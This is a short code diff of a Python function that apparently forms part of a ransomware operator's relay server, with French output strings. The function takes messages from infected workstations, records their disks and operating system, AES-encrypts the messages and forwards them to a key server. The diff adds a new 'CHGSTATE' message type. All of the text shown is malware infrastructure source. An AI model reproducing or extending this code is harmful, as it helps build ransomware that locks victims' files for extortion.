@@ -42,16 +42,21 @@ def handle_serv_cles():
         if not ransomware_queue.empty():
             message_ransomware, socket_ransomware = ransomware_queue.get()
             type_message = message.get_message_type(message_ransomware)
-            CONFIG_WORKSTATION['DISKS'] = message_ransomware['DISKS']
-            CONFIG_WORKSTATION['OS'] = message_ransomware['OS']
             print("Type message : ", type_message)
             if type_message == "INITIALIZE":
+                CONFIG_WORKSTATION['DISKS'] = message_ransomware['DISKS']
+                CONFIG_WORKSTATION['OS'] = message_ransomware['OS']
                 message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
                 network.send_message(serv_cle_socket, message_serv_cle_crypt)
                 response_serv_cle_crypt = network.receive_message(serv_cle_socket)
                 response_serv_cle = security.aes_decrypt(response_serv_cle_crypt, key_serv_cle)
                 serv_cles_queue.put(response_serv_cle)
+                print("Message envoyé : ", message_ransomware)
                 print(CONFIG_WORKSTATION)
+            elif type_message == "CHGSTATE":
+                message_serv_cle_crypt = security.aes_encrypt(message_ransomware, key_serv_cle)
+                network.send_message(serv_cle_socket, message_serv_cle_crypt)
+                print("Message envoyé : ", message_ransomware)
 
 
 def handle_ransomware():
